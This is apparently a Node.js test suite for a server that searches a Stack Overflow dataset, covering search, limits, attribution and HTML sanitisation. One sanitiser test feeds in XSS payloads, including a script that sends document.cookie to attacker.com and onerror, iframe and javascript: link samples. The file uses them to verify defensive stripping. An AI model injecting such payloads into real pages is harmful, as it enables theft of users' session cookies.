import test from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { startWorkstationServer } from '../src/ui/server.js';
import { sanitizeHtml, extractCodeBlocks, htmlToPlainText } from '../src/data/stackoverflow/searchEngine.js';

function makeRequest(url, options = {}, body = null) {
  return new Promise((resolve, reject) => {
    const parsed = new URL(url);
    const req = http.request(parsed, options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(data);
          resolve({ statusCode: res.statusCode, headers: res.headers, body: json });
        } catch {
          resolve({ statusCode: res.statusCode, headers: res.headers, body: data });
        }
      });
    });

    req.on('error', reject);

    if (body) {
      req.write(typeof body === 'string' ? body : JSON.stringify(body));
    }
    req.end();
  });
}

test('STACK OVERFLOW KNOWLEDGE INTEGRATION & ANTI-EXPOSURE VERIFICATION', async (t) => {
  const workstation = await startWorkstationServer({ port: 4620 });
  assert.ok(workstation.url);

  t.after(async () => {
    await workstation.close();
  });

  // =========================================================================
  // GROUP 1: HEALTH & DATASET INTEGRITY
  // =========================================================================
  await t.test('1.1 Health endpoint reports healthy status and exactly 179 questions loaded', async () => {
    const res = await makeRequest(`${workstation.url}/api/solutions/health`);
    assert.equal(res.statusCode, 200);
    assert.equal(res.body.status, 'healthy');
    assert.equal(res.body.loadedQuestions, 179);
    assert.ok(res.body.selectedAnswers > 500);
    assert.ok(res.body.dataLeakageProtection.includes('ACTIVE'));
  });

  // =========================================================================
  // GROUP 2: FUNCTIONAL MULTI-LANGUAGE SEARCH
  // =========================================================================
  await t.test('2.1 Java Error Search: returns relevant question with accepted answer and code', async () => {
    const res = await makeRequest(`${workstation.url}/api/solutions/search`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }, {
      error: 'Why is processing a sorted array faster than unsorted array',
      language: 'java',
      limit: 2
    });

    assert.equal(res.statusCode, 200);
    assert.equal(res.body.success, true);
    assert.ok(res.body.totalMatches > 0);

    const firstResult = res.body.results[0];
    assert.ok(firstResult.title.toLowerCase().includes('sorted array'));
    assert.ok(firstResult.tags.includes('java'));
    assert.ok(firstResult.bestAnswer);
    assert.equal(firstResult.bestAnswer.isAccepted, true);
    assert.ok(firstResult.bestAnswer.codeSnippets.length > 0);
  });

  await t.test('2.2 Python / KeyError Search: matches relevant python exception guidance', async () => {
    const res = await makeRequest(`${workstation.url}/api/solutions/search`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }, {
      error: 'iterate dictionary dictionary keys values',
      language: 'python',
      limit: 2
    });

    assert.equal(res.statusCode, 200);
    assert.equal(res.body.success, true);
    assert.ok(res.body.totalMatches > 0);
    assert.ok(res.body.results[0].tags.includes('python'));
  });

  await t.test('2.3 JavaScript / React Search: matches React state and rendering questions', async () => {
    const res = await makeRequest(`${workstation.url}/api/solutions/search`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }, {
      error: 'setState state update in component',
      language: 'javascript',
      tags: ['reactjs'],
      limit: 2
    });

    assert.equal(res.statusCode, 200);
    assert.equal(res.body.success, true);
    assert.ok(res.body.totalMatches > 0);
  });

  await t.test('2.4 SQL Query Syntax Search: matches database group by and select questions', async () => {
    const res = await makeRequest(`${workstation.url}/api/solutions/search`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }, {
      error: 'SELECT GROUP BY duplicate records delete',
      language: 'sql',
      limit: 2
    });

    assert.equal(res.statusCode, 200);
    assert.equal(res.body.success, true);
    assert.ok(res.body.totalMatches > 0);
  });

  // =========================================================================
  // GROUP 3: SECURITY & DATA NON-EXPOSURE CONTROLS (AVOIDING DATA DRAWBACKS)
  // =========================================================================
  await t.test('3.1 Bulk Dump Prevention: Bounds limit parameter to maximum 5 items', async () => {
    const res = await makeRequest(`${workstation.url}/api/solutions/search`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }, {
      error: 'error',
      language: 'java',
      limit: 999999 // Hostile request attempting to scrape entire 179 questions
    });

    assert.equal(res.statusCode, 200);
    assert.equal(res.body.limitApplied, 5); // Must clamp to maximum 5
    assert.ok(res.body.results.length <= 5);
  });

  await t.test('3.2 Blank Search Prevention: Returns 0 results on empty query without exposing dataset', async () => {
    const res = await makeRequest(`${workstation.url}/api/solutions/search`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }, {
      error: '   ',
      language: '',
      tags: []
    });

    assert.equal(res.statusCode, 200);
    assert.equal(res.body.totalMatches, 0);
    assert.equal(res.body.results.length, 0);
  });

  await t.test('3.3 XSS Sanitization: Strips <script>, <iframe>, and event handlers from HTML output', () => {
    const maliciousHtml = `
      <p>Here is the fix:</p>
      <script>fetch("http://attacker.com/steal?c=" + document.cookie);</script>
      <img src="x" onerror="alert(1)" />
      <iframe src="http://evil.com"></iframe>
      <a href="javascript:alert('pwned')">Click here</a>
      <pre><code>safeCodeSnippet();</code></pre>
    `;

    const clean = sanitizeHtml(maliciousHtml);

    assert.equal(clean.includes('<script>'), false);
    assert.equal(clean.includes('onerror='), false);
    assert.equal(clean.includes('<iframe>'), false);
    assert.equal(clean.includes('javascript:'), false);
    assert.ok(clean.includes('<pre><code>safeCodeSnippet();</code></pre>'));
    assert.ok(clean.includes('rel="noopener noreferrer"'));
  });

  await t.test('3.4 HTML Entity Extraction: code snippets properly extract decoded characters (<, >, &)', () => {
    const htmlWithCode = '<p>Use this:</p><pre><code>for (int i = 0; i &lt; length &amp;&amp; isValid; i++) {}</code></pre>';
    const codes = extractCodeBlocks(htmlWithCode);

    assert.equal(codes.length, 1);
    assert.equal(codes[0], 'for (int i = 0; i < length && isValid; i++) {}');
  });

  // =========================================================================
  // GROUP 4: LEGAL & ATTRIBUTION COMPLIANCE
  // =========================================================================
  await t.test('4.1 Mandatory Attribution: every answer candidate carries links, author, and CC license', async () => {
    const res = await makeRequest(`${workstation.url}/api/solutions/search`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }, {
      error: 'NullPointerException',
      language: 'java',
      limit: 1
    });

    assert.equal(res.statusCode, 200);
    assert.ok(res.body.results.length > 0);
    const item = res.body.results[0];

    // Must have question link
    assert.ok(item.questionUrl.startsWith('https://stackoverflow.com/'));
    // Must have license
    assert.ok(item.contentLicense.includes('CC BY-SA'));
    // Must have attribution notice
    assert.ok(item.attributionNotice.includes('Stack Overflow'));
    // Must have author
    assert.ok(item.author.display_name);

    if (item.bestAnswer) {
      assert.ok(item.bestAnswer.url.startsWith('https://stackoverflow.com/'));
      assert.ok(item.bestAnswer.author.display_name);
      assert.ok(item.bestAnswer.contentLicense.includes('CC BY-SA'));
    }
  });

  // =========================================================================
  // GROUP 5: BUGGRAPH SOLVER INTEGRATION (OPTION A)
  // =========================================================================
  await t.test('5.1 Integrated Solver (/api/solutions/solve): Fuses BugGraph Diagnosis with Stack Overflow Fix', async () => {
    const res = await makeRequest(`${workstation.url}/api/solutions/solve`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }, {
      error: 'TypeError: Cannot read properties of undefined (reading "map")',
      language: 'javascript'
    });

    assert.equal(res.statusCode, 200);
    assert.equal(res.body.success, true);
    assert.equal(res.body.status, 'SOLVED_WITH_COMMUNITY_EVIDENCE');

    // BugGraph internal diagnosis verified
    assert.ok(res.body.diagnosis);
    assert.ok(res.body.diagnosis.rootCause);

    // Community solution enriched
    assert.ok(res.body.communityVerifiedSolution);
    assert.ok(res.body.communityVerifiedSolution.matchedQuestionTitle);
    assert.ok(res.body.communityVerifiedSolution.questionUrl);
    assert.ok(res.body.communityVerifiedSolution.attributionNotice);
  });

  await t.test('5.2 Integrated Solver (/api/solutions/solve): Missing error body yields clean 400 Bad Request', async () => {
    const res = await makeRequest(`${workstation.url}/api/solutions/solve`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }, {
      error: ''
    });

    assert.equal(res.statusCode, 400);
    assert.equal(res.body.error, 'Missing error or trace parameter');
  });
});

